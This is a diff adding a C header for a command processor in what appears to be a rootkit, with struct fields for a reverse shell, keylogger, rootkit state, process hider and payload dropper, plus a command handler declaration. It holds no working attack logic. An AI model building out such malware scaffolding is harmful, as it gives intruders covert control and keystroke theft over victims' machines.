@@ -1,0 +1,31 @@
+#ifndef __COMMAND_PROCESSOR_H
+#define __COMMAND_PROCESSOR_H
+
+#include <sys/types.h>
+#include "userspace/hider.h"
+#include "userspace/dropper.h"
+
+typedef struct {
+    int tracked_pids_map_fd;
+    const char *executable_name;
+    pid_t *reverse_shell_pid;
+    bool *keylogger_active;
+    volatile bool *rootkit_running;
+    hider_context_t *hider_ctx;
+    dropper_context_t dropper_ctx;
+} command_processor_context_t;
+
+/**
+ * @brief Callback to handle received commands of type event_t.
+ *
+ * Every command will be parsed and executed if execution is
+ * meant to be handled by userspace.
+ *
+ * @param ctx application_context_t
+ * @param data
+ * @param data_sz
+ * @return int
+ */
+int command_processor_handle_received_command(void *ctx, void *data, size_t data_sz);
+
+#endif /* __COMMAND_PROCESSOR_H */
